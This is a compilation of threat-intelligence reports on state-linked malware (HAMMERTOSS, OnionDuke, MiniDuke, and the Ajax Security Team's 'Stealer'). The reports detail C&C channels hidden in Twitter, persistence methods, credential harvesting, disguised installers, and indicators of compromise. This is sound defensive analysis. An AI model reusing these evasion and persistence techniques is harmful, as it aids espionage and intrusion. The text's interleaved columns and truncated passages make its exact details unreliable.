are encrypted—makes it harder for network 
defenders to discern between malicious and 
legitimate traffic.•  Using steganography and varying the image size 
makes the target payload—the image containing 
the appended, encoded commands—less 
predictable.Even if the network defenders are 
able to predict or identify the target payloads, 
they need the associated HAMMERTOSS 
sample and relevant tweet containing the 
related encryption key information to decrypt 
the contents.APT29: AN ADAPTIVE AND DISCIPLINED 
THREAT GROUP
HAMMERTOSS illustrates APT29’s ability to adapt 
quickly during operations to avoid detection and 
removal.For example, if an organization blocks 
access to GitHub, APT29 could easily redirect 
HAMMERTOSS to download an image with 
encrypted instructions from another website.Similarly, if an organization starts monitoring 
Twitter activity on their network, APT29 could 
easily switch to using the Uploader variant of 
HAMMERTOSS, which does not use Twitter and 
communicates directly to a specified URL.If an 
organization identifies the handle generation 
algorithm and attempts to research old Twitter 
accounts, tweets, or secondary URLs, APT29 
could easily delete previously used accounts or the 
locations where images were stored.While each technique in HAMMERTOSS is not 
new, APT29 has combined them into a single piece 
of malware.Individually, each technique offers 
some degree of obfuscation for the threat group’s 
activity.In combination, these techniques make it 
particularly hard to identify HAMMERTOSS or spot 
malicious network traffic; determine the nature 
and purpose of the binary; discern the malware’s 
CnC method and predict its CnC accounts; capture 
and decode second-stage CnC information; and 
pinpoint and decrypt the image files containing 
malware commands.This makes HAMMERTOSS 
a powerful backdoor at the disposal of one of the 
most capable threat groups we have observed.1313

HAMMERTOSS: Stealthy Tactics Define a Russian Cyber Threat GroupSPECIAL REPORTTo download this or other  
FireEye Threat Intelligence reports, 
visit: https://www.fireeye.com/reports.html

FireEye, Inc.  |  1440 McCarthy Blvd.Milpitas, CA 95035  |  408.321.6300  |  877.FIREEYE (347.3393)  |  info@fireeye.com  |  www.fireeye.com

© 2015 FireEye, Inc. All rights reserved.FireEye is a registered trademark of 
FireEye, Inc. All other brands, products, or service names are or may be trademarks 
or service marks of their respective owners.SP.APT29.EN-US.072015OnionDuke: APT Attacks Via the Tor Network - F-Secure Weblog :
News from the Lab
Recently, research was published identifying a Tor exit node, located in Russia, that was consistently and
maliciously modifying any uncompressed Windows executables downloaded through it.Naturally this
piqued our interest, so we decided to peer down the rabbit hole.Suffice to say, the hole was a lot deeper
than we expected!In fact, it went all the way back to the notorious Russian APT family MiniDuke, known
to have been used in targeted attacks against NATO and European government agencies.The malware
used in this case is, however, not a version of MiniDuke.It is instead a separate, distinct family of malware
that we have since taken to calling OnionDuke.But lets start from the beginning.When a user attempts to download an executable via the malicious Tor exit node, what they actually
receive is an executable "wrapper" that embeds both the original executable and a second, malicious
executable.By using a separate wrapper, the malicious actors are able to bypass any integrity checks the
original binary might contain.Upon execution, the wrapper will proceed to write to disk and execute the
original executable, thereby tricking the user into believing that everything went fine.However, the
wrapper will also write to disk and execute the second executable.In all the cases we have observed, this
malicious executable has been the same binary (SHA1: a75995f94854dea8799650a2f4a97980b71199d2,
detected as Trojan-Dropper:W32/OnionDuke.A).This executable is a dropper containing a PE
resource that pretends to be an embedded GIF image file.In reality, the resource is actually an encrypted
dynamically linked library (DLL) file.The dropper will proceed to decrypt this DLL, write it to disk and
execute it.A flowchart of the infection process


Once executed, the DLL file (SHA1: b491c14d8cfb48636f6095b7b16555e9a575d57f, detected as
Backdoor:W32/OnionDuke.B) will decrypt an embedded configuration (shown below) and attempt to
connect to hardcoded C&C URLs specified in the configuration data.From these C&Cs the malware may
receive instructions to download and execute additional malicious components.It should be noted, that
we believe all five domains contacted by the malware are innocent websites compromised by the malware
operators, not dedicated malicious servers.A screenshot of the embedded configuration data


Through our research, we have also been able to identify multiple other components of the OnionDuke
malware family.We have, for instance, observed components dedicated to stealing login credentials from
the victim machine and components dedicated to gathering further information on the compromised
system like the presence of antivirus software or a firewall.Some of these components have been observed
being downloaded and executed by the original backdoor process but for other components, we have yet to
identify the infection vector.Most of these components don't embed their own C&C information but
rather communicate with their controllers through the original backdoor process.One component, however, is an interesting exception.This DLL file (SHA1
d433f281cf56015941a1c2cb87066ca62ea1db37, detected as Backdoor:W32/OnionDuke.A) contains
among its configuration data a different hardcoded C&C domain, overpict.com and also evidence
suggesting that this component may abuse Twitter as an additional C&C channel.What makes the
overpict.com domain interesting, is it was originally registered in 2011 with the alias of "John Kasai".Within a two-week window, "John Kasai" also registered the following domains: airtravelabroad.com,
beijingnewsblog.net, grouptumbler.com, leveldelta.com, nasdaqblog.net, natureinhome.com,
nestedmail.com, nostressjob.com, nytunion.com, oilnewsblog.com, sixsquare.net and ustradecomp.com.This is significant because the domains leveldelta.com and grouptumbler.com have previously been
identified as C&C domains used by MiniDuke.This strongly suggests that although OnionDuke and
MiniDuke are two separate families of malware, the actors behind them are connected through the use of
shared infrastructure.A visualization of the infrastructure shared between OnionDuke and MiniDuke


Based on compilation timestamps and discovery dates of samples we have observed, we believe the
OnionDuke operators have been infecting downloaded executables at least since the end of October 2013.We also have evidence suggesting that, at least since February of 2014, OnionDuke has not only been
spread by modifying downloaded executables but also by infecting executables in .torrent files containing
pirated software.However, it would seem that the OnionDuke family is much older, both based on older
compilation timestamps and also on the fact that some of the embedded configuration data make
reference to an apparent version number of 4 suggesting that at least three earlier versions of the family
exist.During our research, we have also uncovered strong evidence suggesting that OnionDuke has been used in
targeted attacks against European government agencies, although we have so far been unable to identify
the infection vector(s).Interestingly, this would suggest two very different targeting strategies.On one
hand is the "shooting a fly with a cannon" mass-infection strategy through modified binaries and, on the
other, the more surgical targeting traditionally associated with APT operations.In any case, although much is still shrouded in mystery and speculation, one thing is certain.While using
Tor may help you stay anonymous, it does at the same time paint a huge target on your back.It's never a
good idea to download binaries via Tor (or anything else) without encryption.The problem with Tor is
that you have no idea who is maintaining the exit node you are using and what their motives are.VPNs
(such as our Freedome VPN) will encrypt your connection all the way through the Tor network, so the
maintainers of Tor exit nodes will not see your traffic and can't tamper with it.Samples:


 • a75995f94854dea8799650a2f4a97980b71199d2
 • b491c14d8cfb48636f6095b7b16555e9a575d57f
 • d433f281cf56015941a1c2cb87066ca62ea1db37


Detected as: Trojan-Dropper:W32/OnionDuke.A, Backdoor:W32/OnionDuke.A, and
Backdoor:W32/OnionDuke.B.Post by — Artturi (@lehtior2)Miniduke still duking it out




At the end of April Microsoft announced that a vulnerability in Word was actively being exploited.This
vulnerability occurred in parsing RTF files and was assigned CVE-2014-1761, a thorough analysis of which
can be found on the HP Security Research blog.We have since seen multiple cases where this exploit is
used to deliver malware and one was particularly interesting as it contained a new variant of MiniDuke
(also known as Win32/SandyEva).MiniDuke was first discussed by Kaspersky in March 2013 in their paper The MiniDuke Mystery: PDF 0-
day Government Spy Assembler 0x29A Micro Backdoorand shortly after in a paper by Bitdefender.Some
of the characteristics of MiniDuke — such as its small size (20 KB), its crafty use of assembly
programming, and the use of zero-day exploits for distribution — made it an intriguing threat.Although
the backdoor is still quite similar to its previous versions, some important changes were made since last
year, the most notable being the introduction of a secondary component written in JScript to contact a
C&C server via Twitter.The RTF exploit document

The exploit document was named Proposal-Cover-Sheet-English.rtf and is quite bland when compared to
the documents that were used in 2013, which were of a political nature.We received the document on
April 8th, only three days after the compilation of the MiniDuke payload, dated April 5th in the PE header.The payload remains quite small at only 24 KB.The functionality of the shellcode which is executed by triggering the vulnerability is rather simple and
straightforward.After decrypting itself and obtaining the addresses of some functions exported by
kernel32.dll, it decrypts and drops the payload in the %TEMP% directory in a file named “a.l” which is
subsequently loaded by calling kernel32!LoadLibraryA.An interesting thing about the shellcode is that before transferring control to any API function it checks
the first bytes of the function in order to detect hooks and debugger breakpoints which may be set by
security software and monitoring tools.If any of these are found the shellcode skips the first 5 bytes of the
function being called by manually executing prologue instructions (mov edi, edi; push ebp; mov ebp, esp)
and then jumping to the function code as illustrated below.The next graph presents the execution flow of this malware when the exploitation is successful.As
mentioned previously this version of the MiniDuke payload comes with two modules which we refer to as
the main module and the TwitterJS module.Execution flow of MiniDuke

Main Component

Installation

Once MiniDuke receives control it checks that the host process is not rundll32.exe and whether the
current directory is %TEMP%.If either of those conditions is met the malware assumes it is run for the
first time and it proceeds with its installation onto the system.MiniDuke gathers information about the
system and encrypts its configuration based on that information, a method also used by OSX/Flashback
(this process is called watermarking by Bitdefender).The end result is that it is impossible to retrieve the
configuration of an encrypted payload if analyzing it on a different computer.The information collected on
infection has not changed since the previous version and consists of the following values:

      volume serial number (obtained from kernel32!GetVolumeInformationA)
      CPU information (obtained with the cpuidinstruction)
      computer name (obtained from kernel32!GetComputerNameA)

Once the encrypted version of the malware is created, it is written into a file in the
%ALLUSERSPROFILE%\Application Data directory.The name of the file is randomly picked from the
following values (you can find this listing and those of the next screenshots on the VirusRadar description:




The filename extension is also picked randomly from the following list:




To persist on the infected system after reboots, the malware creates a hidden .LNK file in the “Startup”
directory pointing to the modified main module.The name of the .LNK file is randomly drawn from the
following values:




The .LNKfile is created using a COM object with the IShellLinkA interface and contains the following
command: “C:\Windows\system32\rundll32.exe %path_to_main_module%, export_function” Which
gives something like:
“C:\Windows\system32\rundll32.exe C:\DOCUME~1\ALLUSE~1\APPLIC~1\data.cat, IlqUenn“.Operation

When the malware is loaded by rundll32.exe and the current directory isn’t %TEMP%, the malware starts
with gathering the same system information as described in the “Installation” section to decrypt
configuration information.As with the previous version of MiniDuke, it checks for the presence of the
following processes in the system:




If any of these are found in the system the configuration information will be decrypted incorrectly, i.e.the
malware will run on the system without any communication to C&C servers.If the configuration data is
decrypted correctly, MiniDuke retrieves the Twitter page of @FloydLSchwartz in search of URLs by
which to reach C&C server.It looks for the tag “X)))” on the page (MiniDuke was searching for “uri!” in
previous samples) and if the tag is found it decrypts a URL from the data that follows it.The Twitter
account @FloydLSchwartz does exist but has only retweets and no strings with the special tag.The malware processes the
downloaded file in the same way as previous samples of MiniDuke: it verifies the integrity of the file using
RSA-2048, then decrypts it, stores in a file and finally executes it.The RSA-2048 public key to verify
integrity of the executable inside the GIF file is the same as in the previous version of MiniDuke.Twitter Generation Algorithm

In the event that MiniDuke is unable to retrieve a C&C URL from this account, it generates a username to
search for based on the current date.The search query changes roughly every seven days and is similar to
the backup mechanism in previous versions that was using Google searches.A Python implementation of
the algorithm can be found in Appendix B.

TwitterJS component
The TwitterJS module is extracted by creating a copy of the Windows DLL cryptdll.dll, injecting a block of
code into it and redirecting the exported functions to this code.Here is how the export address table of the
patched binary looks after modifications.This file is then stored in an Alternate Data Stream (ADS) in NTUSER.DAT in the %USERPROFILE%
folder.Finally this DLL is registered as the Open command when a drive is open, which has the effect of
starting the bot every time the user opens a disk drive.Below you can find the content of
the init.cmd script used by MiniDuke to install TwitterJS module onto the system.When loaded, TwitterJS instantiates the JScript COM object and decrypts a JScript file containing the
core logic of the module.Prior to executing it, MiniDuke applies a light encoding to the script: The next images show the result of
two separate obfuscations, we can see that the variables have different values.This is probably done to
thwart security systems that scan at the entry points of the JScript engine.Result of first obfuscation




Result of second obfuscation

The purpose of this script is to use Twitter to find a C&C and retrieve JScript code to execute.It first
generates a Twitter user to search for; this search term changes every 7 days and is actually a match to the
real account name, not the Twitter account name.The bot then visits the Twitter profiles returned by the
search and looks for links that end with “.xhtml“.When one is found, it replaces “.xhtml” with “.php” and
fetches that link.Information about the computer is embedded in the Accept HTTP header.The first link on the retrieved page should contain base64 data; the name attribute of the link is used as a
rolling XOR key to decrypt the JScript code.Finally, MiniDuke calculates a hash of the fetched script and
compares it with a hardcoded hash in the TwitterJS script.If they match, the fetched script is executed by
calling eval().The tale of the broken SHA-1

The code hashing algorithm used by the component looks very much like SHA-1 but outputs different
hashes (you can find the complete implementation in Appendix B.We decided to search for what was
changed in the algorithm; one of our working hypotheses was that the algorithm might have been altered
to make collisions feasible.We couldn’t find an obvious difference; all the constants and the steps of the
algorithm were as expected.Then we noticed that for short messages only the second 32-bit word was
different when compared to the original SHA-1.SHA1(‘test’) : a94a8fe5ccb19ba61c4c0873d391e987982fbbd3
TwitterJS_SHA1(‘test’) : a94a8fe5dce4f01c1c4c0873d391e987982fbbd3

By examining how this 2nd word was generated we finally discovered that this was caused by a scope
issue.As shown below the SHA-1 function used a variable named f: the function Z() is then called which
also uses a variable named f without the var keyword, causing it to be treated as a global variable rather
than local to the function.The end result is that the value of f is also changed in the SHA-1 function which
affects the value of the 2nd word for that round and ultimately the whole hash for long messages.A likely explanation of how this problem came to be is
                                                  that the variable names were changed to single letters
                                                  using an automated tool prior to embedding it in the
                                                  payload.The 2 f variables probably had different names
                                                  in the original script which avoided the issue.So this
                                                  leaves us with two takeaways: 1) The difference in the
                                                  hashing algorithm was unintentional and 2) Always
                                                  declare your local variables with the var keyword.;-)

Twitter DGA accounts

We generated the list of Twitter search terms for 2013-2014 and checked if any of those were registered.At the moment only one exists, @AA2ADcAOAA, which is the TwitterJS account that was generated
between August 21st and 27th 2013.This account has no tweets.In an effort to discover potential victims,
we registered the Twitter accounts corresponding to the current week both for the main and TwitterJS
components and set up tweets with encrypted URLs so that an infected computer would reach out to our
server.So far we have received connections via the TwitterJS accounts from four computers located in
Belgium, France and the UK.We have contacted national CERTs to notify the affected parties.We detect
the RTF exploit document as Win32/Exploit.CVE-2014-1761.D and the MiniDuke components
as Win32/SandyEva.G.Members of this group have                                     espionage is not an uncommon phenomenon.It
                             accounts on popular Iranian hacker forums such as                                   typically follows an increasing politicization within
                             ashiyane[.]org and shabgard[.]org, and they have                                    the hacking community, particularly around
                             engaged in website defacements under the group                                      geopolitical events.This is followed by increasing
                             name “AjaxTM” since 2010.By 2014, the Ajax                                         links between the hacking community and the
                             Security Team had transitioned from performing                                      state, particularly military and/or intelligence
                             defacements (their last defacement was in                                           organizations.December 2013) to malware-based espionage,
                             using a methodology consistent with other                                           In the late 1990’s and early 2000’s, a similar
                             advanced persistent threat actors in this region.transition occurred within the Chinese hacking
                                                                                                                 community.During that time period, the Chinese
                             It is unclear if the Ajax Security Team operates in                                 hacking community engaged in website
                             isolation or if they are a part of a larger                                         defacements and denial of service attacks in
                             coordinated effort.The Ajax Security Team itself                                   conjunction with incidents such as the accidental
                             uses malware tools that do not appear to be                                         bombing of the Chinese embassy in Belgrade in
                             publicly available.We have seen this group                                         1999, the collision of a U.S. spy plane and a
                             leverage varied social engineering tactics as a                                     Chinese military plane in 2001, and the Japanese
                             means to lure their targets into infecting                                          Prime Minister’s controversial visit to the
                             themselves with malware.Although we have not                                       Yasukuni shrine in 2005.4 Around this time a
                             observed the use of exploits as a means to infect                                   significant shift in philosophy began to take place.victims, members of the Ajax Security Team have
                             previously used publicly available exploit code in                                  Members of the Chinese hacking community that
                             web site defacement operations.espionage by founding a “hacker-for-hire” group



                             1 HP Security Research.“Threat Intelligence Briefing Episode 11”.February 2014.2 Perlroth, N. “In Cyberattack on Saudi Firm, U.S. Sees Iran Firing Back”.October 2012.3 Gallagher, S. “Iranians hacked Navy network for four months?Not a surprise”.February 2014.4 Key.“Honker Union of China to launch network attacks against Japan is a rumor”.September 2010.It is only a form of                                       service attacks to cyber espionage activities.5	   Elegant, S. “Enemies at The Firewall”.December 2007.Dunham, K. & Melnick, J.“’Wicked Rose’ and the NCPH Hacking Group”.Wikipedia.“Network Crack Program Hacker Group”.6	   Dunham, K. & Melnick, J.“’Wicked Rose’ and the NCPH Hacking Group”.7	   Blasco, J.“The connection between the Plugx Chinese gang and the latest Internet Explorer Zeroday”.September 2012.8	   Key.“Honker Union of China to launch network attacks against Japan is a rumor”.September 2010.9	   OpenNet Initiative.“After the Green Movement: Internet Controls in Iran 2009 – 2012”.February 2013.10	 Rezvaniyeh, F. “Pulling the Strings of the Net: Iran’s Cyber Army”.February 2010.“Twitter hackers appear to be Shiite group”.December 2009.11	 OpenNet Initiative.“Iran”.June 2009.12	 The IRGC has also indicated that they would welcome hackers that support the Iranian government.Esfandiari, G.

                                  “Iran Says It Welcomes Hackers Who Work For Islamic Republic”.March 2011, HP Security Research.“Threat Intelligence Briefing Episode 11”.February 2014.13	 BBC Persian.“Structure of Iran’s Cyber Warfare”.14	 Mandiant.“M-Trends: Beyond the Breach, 2014”, page 9.April 2014.15	 Mount, M. “U.S.Officials believe Iran behind recent cyber attacks”.October 2012.16	 Shalal-Esa, A.“Iran strengthened cyber capabilities after Stuxnet: U.S. general”.January 2013, Lim, K. “Iran’s cyber posture”.November 2013.3 www.fireeye.com
Fireeye: Operation Saffron Rose 2013




                             Attack Vectors                                                                 registered the domain “aeroconf2014[.These attack vectors include sending                              following information:
                             email, private messages via social media, fake login
                             pages, and the propagation of anti-censorship                                  From: invite@aeroconf2014[.]org
                             software that has been infected with malware.Subject: IEEE Aerospace Conference 2014

                             Spear phishing                                                                 The email encouraged users to visit a fake
                             During our investigation, we discovered that these                             conference website owned by the attackers:
                             attackers sent targeted emails, as well as private
                             messages through social media.For example, the                                Upon visiting the website, visitors were notified
                             attackers targeted companies in the DIB using a                                that they must install “proxy” software in order to
                             fake conference page as a lure to trick targets into                           access it, which is actually malware.installing malicious software.The attackers




  Figure 1: The Fake
  IEEE Aerospace
  Conference Website




                             7
                                 Bloomberg.“Neiman Marcus Hackers Set Off 60,000 Alerts While Bagging Credit Card Data.” February 2014.services that require security credentials.The
                             attackers tailored these login pages for specific                                     To counter anti-censorship efforts, Iran has
                             targets in the DIB and spoofed a variety of services                                  attempted to block the use of certain software
                             such as Outlook Web Access and VPN login pages.tools.19 In 2012, researchers found that an
                                                                                                                   anti-censorship tool that is primarily used by
                             If users attempt to login through these fake Web                                      Internet users in Iran was bundled with malware
                             pages, the attackers collect their login credentials.includes categories such as pornography and




  Figure 2: The Fake Outlook
  Web Access page




                             17 OpenNet Initiative.“Iran”.June 2009.18 OpenNet Initiative.“After the Green Movement: Internet Controls in Iran 2009 – 2012”.February 2013.19 Torbati, Y.“Iran blocks use of tool to get around Internet filter”.March 2013.20 Marquis-Boire, M. “Iranian anti-censorship software ‘Simurgh’ circulated with malicious backdoor”.May 2012.5 www.fireeye.com
Fireeye: Operation Saffron Rose 2013




                             The “Stealer” Malware                                        The IntelRS.exe is written in .NET and is aptly
                             Host-based Indicators and Malware                            named “Stealer”, as it has various data collection
                             Functionality                                                modules.It drops and launches AppTransferWiz.dll
                             We have observed the Ajax Security Team use a                via the following command:
                             malware family that they identify simply as ‘Stealer’.They deliver this malware as a malicious executable          “C:\WINDOWS\system32\rundll32.exe” “C:\
                             (dropper).The executable is a CAB extractor that            Documents and Settings\{USER}\Application
                             drops the implant IntelRS.exe.This implant, in turn,
                             drops various other components into C:\                      Data\IntelRapidStart\AppTransferWiz.dll”,#110
                             Documents and Settings\{USER}\Application
                             Data\IntelRapidStart\.The following files are               110 is an ordinal that corresponds to “StartBypass”
                             written to disk in this location:                            export in AppTransferWiz.dll.This DLL is written in Delphi.There is code to         •	   Harvests instant messaging (IM) account
                             exfiltrate data over HTTP POST as well, but it is            information: GTalk, Pidgin, Yahoo, Skype
                             unused.We also found incomplete code that would
                             perform SFTP and SMTP exfiltration, which could         •	   Tracks credentials, bookmarks and history
                             be completed in a future version.IntelRS.exe waits in an indefinite
                             loop, until AppTransferWiz.DLL defines this state.•	   Remote Desktop Protocol (RDP) accounts

                             •	    Performs key logging                              •	   Browser URLs




  Figure 4: AppTransferWizard.dll creates sqlite3.dll and
  global atom




  Figure 5: IntelRS.exe sleeps
  until global atom is set and
  sqlite3.dll is present




7 www.fireeye.com
Fireeye: Operation Saffron Rose 2013




                                The Stealer component uses common techniques                      Analysis of the malware indicates that the data is
                                to acquire credential data.For instance, it loads                encrypted via a Rijndael cipher implementation;
                                vaultcli.DLL and uses various APIs shown below to                 more specifically it uses AES which is a specific set
                                acquire RDP accounts from the Windows vault.of configurations of Rijndael.It uses a key size of
                                                                                                  256 bytes and block size of 128 bytes, which
                                Harvested data is encrypted and written to disk on                conforms to the FIPS-197 specification of
                                the local host.The filenames for these encrypted                 AES-256.21 It utilizes the passphrase ‘HavijeBaba’
                                files follow this naming scheme:                                  and a salt of ‘salam!“Havij” means “carrot”, “Baba”
                                an instant messenger application, installed proxy                 means “father”, and “Salam” is a common greeting
                                software).that means “Peace”.Figure 6: Acquiring RDP
  Accounts




                        21
                             ShawnFa.“The Differences Between Rijndael and AES”.October 2006.22
                             Wikipedia.“PBKDF2”.23
                             Microsoft.“Rfc2898DeriveBytes Class”.Examples
                             •	    9 samples compiled on 2013-02-17 07:00           include:

                             •	    4 samples compiled on 2009-07-13 23:42           •	   6dc7cc33a3cdcfee6c4edb6c085b869d was
                                                                                         bundled with an installer for Ultrasurf Proxy
                             •	    3 sample compiled on 2013-10-14 06:48                 software.•	    1 sample compiled on 2013-10-13 09:56            •	   3d26442f06b34df3d5921f89bf680ee9 was
                                                                                         bundled with an installer for Gerdoovpn
                             The 2009 compile time appears to have been                  virtual private network software.forged, while the 2013 compile times may be
                             legitimate.•	   3efd971db6fbae08e96535478888cff9 was
                                                                                         bundled with an installer for the Psiphon
                             In some cases, we found an implant but not the              proxy.parent dropper.In total, 22 of the 23 implants that
                             we identified during our research had unique           •	   288c91d6c0197e99b92c06496921bf2f was
                             compile times ranging from 2013-10-29 until                 bundled with an installer for Proxifier
                             2014-03-15.We identified two implants that were            software.both compiled on 2014-3-15 at 23:16.These
                             compile times appear to be legitimate and coincide     These droppers were also designed to visually
                             with attempted intrusion activity attributed to        spoof the appearance of the above applications.these attackers.These droppers contained icons used in the
                                                                                    legitimate installers for these programs.The f:\       Stealer.exe
                             Projects\ path may be from an external storage        LegalCopyright
                             device such as a thumb drive.It is therefore         Copyright
                             possible that only one person has access to the          2013
                             source code, but keeps a separate repository on       OriginalFilename
                             an external storage device.Alternatively, the        Stealer.exe
                             different file paths could be the result of two
                                                                                   ProductName
                             different actors storing their source code in two
                                                                                   Process for Windows
                             different locations.ProductVersion
                             Builder Artifacts                                     1.0.0.0
                             In nine of the implants that we collected, we found   Assembly Version
                             a consistent portable executable (PE) resource        1.0.0.0
                             with a SHA256 of
                             5156aca994ecfcb40458ead8c830cd66469d5f5
                             a031392898d323a8d7a7f23d3.This PE
                             resource contains the VS_VERSION_INFO.In
                             layman’s terms, this can best be described as the
                             metadata describing the executable file.This
                             specific PE resource contained the
                             following information:

                             Note the InternalName of ‘Stealer.exe’.This is the
                             attackers’ name for this malware family.10 www.fireeye.com
Fireeye: Operation Saffron Rose 2013




                             The “Stealer” Builder and Tools                             The Builder option enables an attacker to
                             During our research, we recovered two different             configure a new Stealer backdoor.The user can
                             tools used by the members of the Ajax Security              configure the new backdoor to connect to a
                             Team in conjunction with targeted intrusion                 specific CnC server with a personalized username
                             activities.The first tool, labeled the ‘Stealer Builder’   and password.The attacker can bind the backdoor
                             was compiled on 2014-04-08.This compile date               to a legitimate application of his or her choosing, or
                             may indicate that the group is still active.they can cloak it with an icon designed to make the
                                                                                         backdoor appear as though it is a legitimate file.Upon executing the ‘Stealer Builder’ the user is            We also noted that the Builder did not allow the
                             presented with an option to load the ‘Builder’ or to        attacker to select a new passphrase or salt used to
                             ‘Decrypt’ logs generated from a victim and                  encrypt the stolen data.The passphrase
                             exfiltrated to a command-and-control (CnC) server           ‘HavijeBaba’ and a salt of ‘salam!*%#’ are both
                             under the groups’ control.hardcoded into the builder.Figure 8: The Stealer Tool




     Figure 9: The Stealer Builder




11 www.fireeye.com
Fireeye: Operation Saffron Rose 2013




                             During testing, we observed that backdoors            Base64 encoded text into plaintext.Members of
                             generated by this Stealer Builder had a timestamp     the Ajax Security Team likely this use tool to
                             of 2013-12-19.We had one backdoor in our             encode the configuration data seen in
                             repository with this same timestamp.This sample      RapidStartTech.stl files.As noted above, the
                                                                                   RapidStartTech.stl contains the backdoor’s FTP
                             (MD5 1823b77b9ee6296a8b997ffb64d32d21)                credentials, implant name, decoy name, and
                             was configured to exfiltrate data to ultrasms[.]ir.screenshot interval, along with boolean settings for
                             The VS_VERSION_INFO PE resource mentioned             startup, keylogger, and screenshot plugins.above (SHA256
                             5156aca994ecfcb40458ead8c830cd66469d5f5               Encoding and decoding Base64 data is a
                             a031392898d323a8d7a7f23d3) is an artifact of          straightforward task and the standard Linux
                             the Stealer builder that we recovered.The builder    operating system offers a number of command line
                             generates an executable named IntelRapidStart.tools to achieve this task.The presence of a
                             exe.This executable contains the aforementioned      Windows-based GUI tool that simplifies encoding
                             VS_VERSION_INFO PE resource.and decoding Base64 data indicates that these
                                                                                   tools may have been developed for less adept
                             We also recovered a tool designed to encode           users.plaintext into Base64 encoded text or decode




     Figure 10: Base64 Encoder




12 www.fireeye.com
Fireeye: Operation Saffron Rose 2013




                                Command-and-Control Infrastructure                    The website used in the Aerospace Conference
                                The CnC infrastructure consists of distinct, but      attack was aeroconf2014[.]org, which is registered
                                linked, clusters that have targeted both the users    to info@usa.gov[.]us.However, historical WHOIS
                                of anti-censorship tools in Iran as well as defense   information shows that the domain was registered
                                contractor companies in the U.S.                      by keyvan.ajaxtm@gmail[.]com—the same domain
                                                                                      used to register ajaxtm[.]org, the website of the
                                The first cluster contains the domain used in the     Ajax Security Team.Figure 11: Ajax Security
     Team’s Phishing
     Infrastructure




13 www.fireeye.com
Fireeye: Operation Saffron Rose 2013




                             The second cluster comprises the CnC                  domains registered by osshom@yahoo[.]com, many
                             infrastructure used in the anti-censorship attacks.of which are consistent with the pattern of
                             The majority of the samples we analyzed connect       registering domains with associations to Google
                             to intel-update[.]com and update-mirror[.]com,        and Yahoo services.We also observed crossover
                             which were registered by james.mateo@aim[.]com.with a sample that connected to both intel-
                             The domain intel-update[.]com resolved to the IP      update[.]com and ultrasms[.]ir, which was
                             address 88.150.227.197, which also hosted             registered by lvlr98@gmail[.]com.Figure 12: Ajax Security
     Team’s Stealer CnC
     Infrastructure




   Figure 13: Overlap between the
   phishing and stealer clusters




14 www.fireeye.com
Fireeye: Operation Saffron Rose 2013




                             These two clusters are linked by a common IP            found that the majority had either their timezone
                             address (5.9.244.151), which is used by both ns2.set to “Iran Standard Time” or had their language
                             aeroconf2014[.]org and office.windows-                  setting set to Persian:
                             essentials[.]tk.•	    44 had their timezone set to “Iran Standard
                             A third cluster of activity was found via analysis of         Time” (37 of those also have their language set
                             1d4d9f6e6fa1a07cb0a66a9ee06d624a.This                        to Persian)
                             sample is a Stealer variant that connects to the
                             aforementioned intel-update[.]com as well as            •	    Of the remaining 33, 10 have Persian
                             plugin-adobe[.]com.The domain plugin-adobe[.]language settings
                             com resolved to 81.17.28.235.]com, we have not discovered any malware
                             connecting to these domains.The largest concentration of victims is in Iran,
                                                                                     based on the premise that Persian language
                             Victimology                                             settings and “Iran Standard Time” correlate the
                             During our investigation, we were able to recover       victim to be geographically located in Iran.As such,
                             information on 77 victims from one CnC server           we believe that attackers disguised malware as
                             that we discovered while analyzing malware              anti-censorship tools in order to target the users of
                             samples that were disguised as anti-censorship          such tools inside Iran as well as Iranian dissidents
                             tools.While analyzing the data from the victims, we    outside the country.]org and                                 However, the group appears to have become
                             shabgard[.]org.Other members include “0day”,                                    increasingly political.For example, in a blog post in
                             “Mohammad PK” and “Crim3r”.The Ajax Security                                    2012, “Cair3x” announced the targeting of Iran’s
                             Team website at ajaxtm[.]org had a Web forum                                     political opponents.with at least 236 members.And in late hours
                                            of Wednesday, June 24, 2012, we attacked these websites
                                            and defaced them by writing the words “We are young but
                                            we can” on their websites.This is so the enemies of this
                                            country know that the blood of our martyr will never be
                                            in vain and they will always be remembered in the heart
                                            of gallant Iranians.24
                                 	   By March 2010 HUrr!c4nE!was identifying as a member of Ajax Security Team in exploit releases http://www.exploit-db.com/exploits/17011/ and the

                                     first defacement archived by Zone-H, which lists both HUrr!c4nE!He
                             “#OpUSA”.27                                                                        registered the ajaxtm[.]org domain name using the
                                                                                                                email address keyvan.ajaxtm@gmail[.]com.This
                             By early 2014, the Ajax Security Team appears to                                   was also the email address used to register the
                             have dwindled.There have been no defacements                                      domain aerospace2014[.]org, which was used in
                             since December 2013.The website and forum at                                      spear phishing attacks against companies in the
                             ajaxtm[.]org operated by “HUrr!c4nE!”, aka                                         U.S. and is linked with malware activity directed at
                             “k3yv4n”, is no longer active.users of anti-censorship tools in Iran.Figure 15: Screenshot of the
    defacement content used in
    #OpUSA




                              27
                                   Ashraf, N. “#OpIsrael: Hacktivists Starting Cyber Attack against Israel on 7th of April”.March 2013.“OpUSA Targeting Government & Financial Sectors on

                                       07 May 2013: Likely Tools, Targets and Mitigating Measures”.May 2013.17 www.fireeye.com
Fireeye: Operation Saffron Rose 2013




                             “HUrr!c4nE!” features prominently in all the                                        For example, the Ajax Security Team could just be
                             group’s activities and defacements.Although there                                  using anti-censorship tools as a lure because they
                             has been a decline in public-facing Ajax Security                                   are popular in Iran, in order to engage in activities
                             Team activity, this coincides with an increase in                                   that would be considered traditional cybercrime.In
                             malware activity linked to the group’s                                              one case, “HUrr!c4nE!”, using the email address
                             infrastructure.keyvan.ajaxtm@gmail[.]com, has been flagged for
                                                                                                                 possible fraud by an online retailer.While
                             • ~2009—Membership in ashiyane.org and                                              “HUrr!c4nE!” is engaged in operations that align
                             shabgard.org forums                                                                 with Iran’s political objectives, he may also be
                                                                                                                 dabbling in traditional cybercrime.In addition                                  Third parties control and conduct the attack, but
                             to attacking companies in the U.S., they have                                       the national government encourages them as a
                             targeted domestic users of anti-censorship                                          matter of policy.28
                             technology.government remains inconclusive.Figure 16: Screenshot
 of an online retailer’s
 fraud alert




                             28
                                  Healey, J.“Beyond Attribution: Seeking National Responsibility for Cyber Attacks”.January 2012.These highly
                                     capabilities.While the relationship between actors      sophisticated cyber attacks easily circumvent
                                     such as the Ajax Security Team and the Iranian           traditional signature-based defenses, such as
                                     government is unknown, their activities appear to        next-generation firewalls, IPS, anti-virus, and
                                     align with Iranian government political objectives.gateways.The FireEye Threat Prevention Platform
                                                                                              provides real-time, dynamic threat protection
                                     The capabilities of the Ajax Security Team remain        without the use of signatures to protect an
                                     unclear.This group uses at least one malware            organization across the primary threat vectors and
